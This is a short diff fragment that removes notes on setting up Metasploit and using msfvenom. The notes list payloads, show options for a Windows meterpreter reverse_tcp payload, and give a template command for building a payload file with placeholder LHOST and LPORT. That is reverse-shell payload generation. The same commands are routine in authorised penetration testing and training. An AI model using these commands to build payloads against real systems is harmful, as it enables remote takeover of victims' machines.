@@ -1,8 +1,0 @@
->> cd /usr/share/metasploit-framework/
->> gem install bundler
->> bundle install
->> cd /root
-msfvenom -l payloads
-msfvenom -l payloads
-msfvenom –list-options -p windows/meterpreter/reverse_tcp
-msfvenom -p [payload] LHOST=[your ip address] LPORT=[the port number] -f [file type] > [path]
